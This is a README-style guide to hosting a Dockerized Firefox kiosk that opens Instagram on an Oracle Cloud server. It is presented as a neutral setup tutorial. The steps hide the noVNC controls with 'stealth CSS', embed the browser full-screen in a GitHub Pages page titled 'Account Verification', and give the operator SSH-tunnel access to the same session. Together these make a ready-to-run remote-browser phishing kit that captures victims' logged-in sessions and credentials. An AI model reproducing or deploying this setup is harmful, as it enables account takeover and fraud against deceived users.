# Oracle Cloud: Browser-in-Browser (BiB) Setup

This repository provides step-by-step instructions for deploying a **Dockerized Firefox Kiosk** on an Oracle Cloud Ubuntu instance, along with a lightweight frontend bridge using GitHub Pages.

---

## Overview

This setup includes:

- A **Firefox kiosk container** running in desktop mode  
- Hosted on an **Oracle Cloud Ubuntu server**  
- Exposed via **port 80**  
- Embedded into a simple **GitHub Pages frontend**  
- Optional **SSH tunnel access** for administrative control  

---

## 1. Server-Side Deployment (Ubuntu + Docker)

Run the following commands on your Oracle Cloud instance.

### Step A: Clean Up Existing Containers
```bash
sudo docker rm -f firefox-mobile firefox-kiosk firefox 2>/dev/null
```

### Step B: Free Port 80 (Stop Apache)
```bash
sudo systemctl stop apache2 2>/dev/null
sudo systemctl disable apache2 2>/dev/null
```

### Step C: Launch Firefox Kiosk (Desktop Mode)
```bash
sudo docker run -d \
  --name=firefox-kiosk \
  -p 80:5800 \
  -e FF_OPEN_URL="https://www.instagram.com/" \
  -e FF_KIOSK=1 \
  -v ~/firefox_data:/config:rw \
  --shm-size 2g \
  jlesage/firefox
```
### Step D: Apply Stealth CSS (Hide NoVNC UI)
This removes visible UI elements for a cleaner, native browser appearance.
```bash
sudo docker exec firefox-kiosk sed -i \
's/<\/head>/<style>#noVNC_control_bar, #noVNC_control_bar_handle, .noVNC_panel { display: none !important; }<\/style><\/head>/' \
/opt/noVNC/index.html
```

## 2. GitHub Pages Frontend ("Bridge")
Create an index.html file in your repository to act as a secure frontend wrapper.
⚠️ Replace YOUR_SERVER_IP with your Oracle Cloud public IP address.
```HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background: #000;
        }
        iframe {
            width: 100vw;
            height: 100vh;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="http://YOUR_SERVER_IP"></iframe>
</body>
</html>
```

## 3. Admin Access via SSH Tunnel
To securely access the backend browser session without exposing additional ports:
```bash
ssh -i ~/oracle.key -L 8080:localhost:80 ubuntu@YOUR_SERVER_IP
```
Then open your browser and navigate to:
```bash
http://localhost:8080
```
